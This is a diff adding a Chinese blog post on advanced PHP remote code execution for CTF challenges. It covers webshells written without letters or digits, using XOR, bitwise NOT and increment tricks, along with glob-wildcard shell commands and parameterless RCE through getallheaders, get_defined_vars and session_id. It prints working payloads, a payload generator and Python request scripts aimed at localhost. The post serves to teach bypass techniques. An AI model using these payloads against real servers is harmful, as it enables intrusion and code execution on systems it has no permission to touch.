@@ -1,0 +1,1242 @@
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      RCE提高篇 | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《RCE提高篇》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2019/10/17/RCE提高篇/" itemprop="url">
+		RCE提高篇
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2019/10/17/RCE提高篇/" itemprop="url">
+		<time datetime="2019-10-17T12:31:31.000Z" itemprop="datePublished">
+	  		2019-10-17
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2019/10/17/RCE提高篇/" itemprop="url">
+		<time datetime="2019-10-17T12:31:31.000Z" itemprop="dateUpdated">
+	  		2019-11-05
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/知识总结/" class=" ">
+			知识总结
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2019/10/17/RCE提高篇/_visitors" data-url="/2019/10/17/RCE提高篇/" data-title="RCE提高篇">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2019/10/17/RCE提高篇/_likes" data-url="/2019/10/17/RCE提高篇/" data-title="RCE提高篇" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，需要了解一下命令执行的函数，这里推荐几篇文章，来认识这些函数。<br><a href="https://www.anquanke.com/post/id/173201" target="_blank" rel="noopener">浅谈eval和assert</a><br><a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="noopener">从底层分析eval和assert的区别</a><br><a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">命令执行与代码执行的小结</a><br><a href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw" target="_blank" rel="noopener">巧用命令注入的N种方式</a><br><a href="https://www.smi1e.top/%25e5%2591%25bd%25e4%25bb%25a4%25e6%25b3%25a8%25e5%2585%25a5%25e7%25bb%2595%25e8%25bf%2587%25e5%25a7%25bf%25e5%258a%25bf/" target="_blank" rel="noopener">命令注入绕过姿势</a><br>我就不在说这几个东西，大牛们都说的很细。我就直接进入我们的正题。</p>
+<h2 id="无数字字母webshell"><a href="#无数字字母webshell" class="headerlink" title="无数字字母webshell"></a>无数字字母webshell</h2><p>例题：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+error_reporting(0);
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
+        die("NO.");
+    }
+    eval($code);
+}else{
+    highlight_file(__FILE__);
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先要求：不能存在数字字母。<br>需要我们明确思路：<br>核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符，然后再利用PHP允许动态函数执行的特点，拼接出一个函数名，如“assert”，然后动态执行之即可。<br>首先，eval是可以被<code>disable_function</code>禁用吗？为什么？</p>
+<p>php的eval函数并不是系统组件函数，因此我们在php.ini中使用disable_functions是无法禁止它的。<br>eval是zend的，因此不是PHP_FUNCTION 函数。通俗的说就是，eval是用c写的是底层的东西，它不是php层面的函数。所以php.ini无法禁用。</p>
+<p>assert可以在php7使用吗？（默认情况）<br>默认不可以，需要配置。<br>了解php7特性<br>推荐文章：<a href="http://oopsguy.com/2016/10/22/php7-new-features/" target="_blank" rel="noopener">PHP7新特性一览</a><br>先说一下php5和php7的一些差异吧<br>php5中assert是一个函数，我们可以通过</p>
+<pre class="line-numbers language-html"><code class="language-html">$f='assert';$f(...);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样的方法来动态执行任意代码。<br>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。下面我们用两种环境下进行测试，进行比较。做个记录。</p>
+<h3 id="php5环境下"><a href="#php5环境下" class="headerlink" title="php5环境下"></a>php5环境下</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>思路：异或<br>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。<br>这里的大部分是不可见字符，这里是用url编码表示。即</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
+$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);
+即：?code=$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]); 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>把黑名单的字符转化成转化成白名单的字符异或拼在一起。构造payload写的一个小脚本：</p>
+<pre class="line-numbers language-python2"><code class="language-python2">import string
+import urllib
+black=string.letters+string.digits
+# print black
+# allstring=string.printable
+white=string.punctuation
+# print white
+
+def yihuo(str1):
+    flag=''
+    for x in str1:
+        for i in white:
+            o=ord(x)^ord(i)
+            if chr(o) not in black:
+                if chr(o)=='\'' or chr(o)=='\\':
+                    flag+='(\'\\'+urllib.quote(chr(o))+'\'^\''+urllib.quote(i)+'\').'
+                    break
+                flag+='(\'%'+(chr(o).encode('hex'))+'\'^\''+urllib.quote(i)+'\').'
+                break
+    return flag[0:len(flag)-1]
+st='assert'
+print yihuo(st)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>注：记得对一些字符进行url编码，比如&amp;和+，都引起解析问题。</p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。<br>方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;{2}</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：<br>一般利用汉字，因为汉字的uniocode占3字节。可以利用其构造字母<br><img src="https://s2.ax1x.com/2019/10/18/Ked1wn.png" alt="Ked1wn.png"><br>利用这个特性。生成payload:</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$__=('>'>'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>')+('</span><span class="token punctuation">></span></span>'>'&lt;');
+$_=$__/$__;
+
+$____='';
+$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});
+
+$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});
+
+$_=$$_____;
+$____($_[$__]);
+我测试发现{}可以用l[]来替换：
+&lt;?php
+$__=('>'>'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>')+('</span><span class="token punctuation">></span></span>'>'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___[$_]);$___="和";$____.=~($___[$__]);$___="和";$____.=~($___[$__]);$___="的";$____.=~($___[$_]);$___="半";$____.=~($___[$_]);$___="始";$____.=~($___[$__]);$_____='_';$___="俯";$_____.=~($___[$__]);$___="瞰";$_____.=~($___[$__]);$___="次";$_____.=~($___[$_]);$___="站";$_____.=~($___[$_]);$_=$$_____;$____($_[$__]);
+即：assert($_POST[2])
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个答案还利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code>。记得传入参数时需要进行url编码。</p>
+<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>这种方法的核心是：递增运算</p>
+<p>这就得借助PHP的一个小技巧：<a href="https://www.php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">参见文档</a></p>
+<p>也就是说，<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，<code>&#39;b&#39;++ =&gt; &#39;c&#39;</code>… 所以，我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p>
+<p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>。。<br>再取这个字符串的第一个字母，就可以获得’A’了。<br>利用这个技巧，P神编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$_=[];
+$_=@"$_"; // $_='Array';
+$_=$_['!'=='@']; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E 
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+
+$____='_';
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
+
+$_=$$____;
+$___($_[_]); // ASSERT($_POST[_]);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上述三种方式在php5下都能成功执行。</p>
+<h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><p><code>*</code>可以代替0个及以上任意字符<br><code>?</code>可以代表1个任意字符<br>在PHP开启短标签即<code>short_open_tag=on</code>时，可以使用<code>&lt;?=$_?&gt;</code>输出变量</p>
+<pre class="line-numbers language-html"><code class="language-html">$_=`/???/???%20/???/???/????/?????.???`;?><span class="token prolog">&lt;?=$_?></span>
+"/bin/cat /var/www/html/index.php"
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html">长度限制，使用通配：
+$_=/???/???%20/???/???/????/;?><span class="token prolog">&lt;?=$_?></span>
+正则过滤了$和_,改进为：
+?><span class="token prolog">&lt;?=`/???/???%20/???/???/????/*`?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>p神还提供了另一种方式<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob" target="_blank" rel="noopener">glob通配符</a></p>
+<p>其中说到我们可以通过上传临时文件，这样我们就可以获得一些随机字符,上传的临时文件名字都是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。<br>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势来干掉一些特殊字符。<br>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。<br>所以，我们可以通过<code>[@-[]</code>来限制字符为大写字符，即ascii码值在40-91的字符。同样也可以限制在小写字符97-123即可，这样我们就可以准确的确定文件名。<br>这里还有一个知识点就是<br>shell下可以利用<code>.</code>来执行任意脚本。<br><img src="https://s2.ax1x.com/2019/10/26/KD8MZQ.png" alt="KD8MZQ.png"><br>用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？临时文件不就可以吗？</p>
+<p>构造poc，执行任意命令啊<br>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。<br>（orz p神tql）</p>
+<h3 id="php7环境下"><a href="#php7环境下" class="headerlink" title="php7环境下"></a>php7环境下</h3><p>上面的方法在php7.0.12测试成功。php7.1.13和php7.2.10测试失败。未成功的原因<br>是assert不支持函数名动态执行代码。所以不能执行。<br>php7中修改了表达式执行的顺序：<a href="https://www.php.net/manual/zh/migration70.incompatible.php" target="_blank" rel="noopener">参考文档</a><br><img src="https://s2.ax1x.com/2019/10/18/Ke2nqf.png" alt="Ke2nqf.png"><br>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式</p>
+<p>所以很简单了，构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p>
+<pre class="line-numbers language-html"><code class="language-html">(~%8F%97%8F%96%91%99%90)();  //phpinfo
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>得到脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$want='phpinfo';
+$want=str_split($want);
+$flag='';
+foreach ($want as $v){
+    $flag.=~$v;
+}
+echo "(~".urlencode($flag).")();";
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>难度升级：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(strlen($code)>35){
+        die("Long.");
+    }
+    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
+        die("NO.");
+    }
+    eval($code);
+}else{
+    highlight_file(__FILE__);
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解决思路同样两种：<br>1.异或（未过滤 <code>_$</code>时可以异或出<code>_POST</code>或<code>_GET</code>字符串来接受参数,绕过长度限制）<br>2.<code>. file</code>任意命令执行（上面的方法四）过滤<code>$</code>用这种方法。需要注意php5和php7的差别。</p>
+<p>为啦了算缩短字符长度我们可以字符异或：（未过滤 <code>_$</code>）</p>
+<pre class="line-numbers language-html"><code class="language-html">测试环境：# PHP Version 7.0.33
+_POST为：'_'.("{`{|"^"+/((")
+/?code=$_="`{{{"^"?&lt;>/";${$_}[_](${$_}[__]);&amp;_=assert&amp;__=var_dump(scandir('/'));
+即$_='_GET';
+$_GET[_]($_GET[__]);
+即getshell 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>过滤<code>_$</code>只有<code>. file</code>任意命令执行了。。。</p>
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>大致思路如下：<br>1.利用超全局变量进行bypass，进行RCE<br>2.进行任意文件读取<br>例子：</p>
+<pre class="line-numbers language-html"><code class="language-html">if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
+    eval($_GET['code']);
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>正则匹配：</p>
+<pre class="line-numbers language-html"><code class="language-html">/[^\W]+\((?R)?\)/
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>匹配函数格式的的字符串。<br>如：<code>a(b(c()));</code>,<code>a();</code><br>只能执行函数，但是不能传入参数即不能<code>a(1);</code>这种格式的。<br>因此，缺少参数，就增加了我们了rce的难度。</p>
+<p>思想：<strong>超全局变量进行bypass，进行RCE。</strong></p>
+<p>超全局变量：</p>
+<pre class="line-numbers language-html"><code class="language-html">$GLOBALS   //引用全局作用域中可用的全部变量
+$_SERVER   //服务器和执行环境信息
+$_GET      //HTTP GET 变量
+$_POST     //HTTP POST 变量
+$_FILES    //HTTP 文件上传变量
+$_COOKIE   //HTTP Cookies
+$_SESSION  //Session 变量
+$_REQUEST  //HTTP Request 变量 默认情况下包含了 [$_GET]，[$_POST] 和 [$_COOKIE]的数组。
+$_ENV      //环境变量
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="函数-getallheaders"><a href="#函数-getallheaders" class="headerlink" title="函数 getallheaders()"></a>函数 getallheaders()</h3><p><img src="https://s2.ax1x.com/2019/11/05/MS7OdP.png" alt="MS7OdP.png"><br><strong>注意：在apache环境下。nginx无法使用</strong>原因是getallheaders()是apache函数。<br>核心思路：<br>1.参数code不能使用带参数的php函数<br>2.让参数code获取其他位置传入的参数(http header)<br>3.getallheaders()可返回http header<br>4.code可以获取到http header中的参数，相当于任意参数调用<br>5.成功进行RCE</p>
+<p>payload:</p>
+<pre class="line-numbers language-html"><code class="language-html">?code=eval(end(getallheaders())); 执行http header的最后一个参数的值。
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2019/11/05/MppeMV.png" alt="MppeMV.png"></p>
+<h3 id="函数：get-defined-vars"><a href="#函数：get-defined-vars" class="headerlink" title="函数：get_defined_vars()"></a>函数：get_defined_vars()</h3><p><img src="https://s2.ax1x.com/2019/11/05/Mp9R6x.png" alt="Mp9R6x.png"></p>
+<p>其可以回显全局变量:</p>
+<pre class="line-numbers language-html"><code class="language-html">$_GET
+$_POST
+$_FILES
+$_COOKIE
+$_ENV
+$_SERVER
+$_REQUEST
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>和上面方法一样。通过全局变量传入我们的参数，RCE。<br>payload:</p>
+<pre class="line-numbers language-html"><code class="language-html">?code=eval(end(current(get_defined_vars())));&amp;alex=phpinfo();
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2019/11/05/Mpi21s.png" alt="Mpi21s.png"></p>
+<p>如果发现对</p>
+<pre class="line-numbers language-html"><code class="language-html">$_GET
+$_POST
+$_COOKIE
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>过滤的话。可已使用<code>$_file</code>。<br>直接写一个上传。这里有个坑点。传入的文件空格被替换成<code>_</code>。防止干扰可以用hex编码。</p>
+<p>这里需要注意的是飘零师傅用的环境为只能获取</p>
+<pre class="line-numbers language-html"><code class="language-html">$_GET
+$_POST
+$_FILES
+$_COOKIE
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以用end直接获取。我测试用end获取的是<code>_server</code>。。。无法通过<code>_files</code>。。。识环境而定吧。</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+from io import BytesIO
+def str_to_hex(s):
+    return ''.join([hex(ord(c)).replace('0x','') for c in s])
+payload = str_to_hex("system('ls /tmp');")
+
+files = {
+  payload: BytesIO()
+}
+
+r = requests.post('http://localhost/222.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)
+
+print(r.content)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="函数：sessin-id"><a href="#函数：sessin-id" class="headerlink" title="函数：sessin_id()"></a>函数：sessin_id()</h3><p>其实这里还能从<code>$_COOKIE</code>下手：<br><img src="https://s2.ax1x.com/2019/11/05/MpblM4.png" alt="MpblM4.png"><br>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路:<code>hex2bin</code><br><img src="https://s2.ax1x.com/2019/11/05/M9KjIA.png" alt="M9KjIA.png"></p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+url = 'http://localhost/222.php?code=eval(hex2bin(session_id(session_start())));'
+def str_to_hex(s):
+    return ''.join([hex(ord(c)).replace('0x','') for c in s])
+payload = str_to_hex("phpinfo();")
+cookies = {
+    'PHPSESSID':payload
+}
+r = requests.get(url=url,cookies=cookies)
+print(r.content)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="函数：getenv"><a href="#函数：getenv" class="headerlink" title="函数：getenv()"></a>函数：getenv()</h3><p><code>$_ENV</code>，对应函数为<code>getenv()</code><br>从一个偌大的数组中取出我们指定的值<br>可以使用array_rand()获取数组中随机的一个键或者array_flip()数组中获取随机的值。<br>通过爆破，获取我们想要的值。。。</p>
+<h3 id="函数：dirname-amp-chdir"><a href="#函数：dirname-amp-chdir" class="headerlink" title="函数：dirname() &amp; chdir()"></a>函数：dirname() &amp; chdir()</h3><p>必须RCE吗？？？。可以直接读文件吧。。<br>了解一些函数：</p>
+<pre class="line-numbers language-html"><code class="language-html">getcwd()    //返回当前目录
+scandir()   //列出指定路径中的文件和目录
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>chdir()  切换目录<br><img src="https://s2.ax1x.com/2019/11/05/M91x0S.png" alt="M91x0S.png"><br>dirname()  返回路径中的目录部分<br><img src="https://s2.ax1x.com/2019/11/05/M98iUe.png" alt="M98iUe.png"></p>
+<p>分析：假设当前目录为/var/www/html</p>
+<pre class="line-numbers language-html"><code class="language-html">dirname(getcwd()) //获取当前目录所在的路径 即：文件所在的上一级文件夹路径/var/www
+chdir(dirname(getcwd())) //切换到当前目录所在的目录，返回bool值。
+dirname(chdir(dirname(getcwd())))  //获取上述切换到的目录/var/www
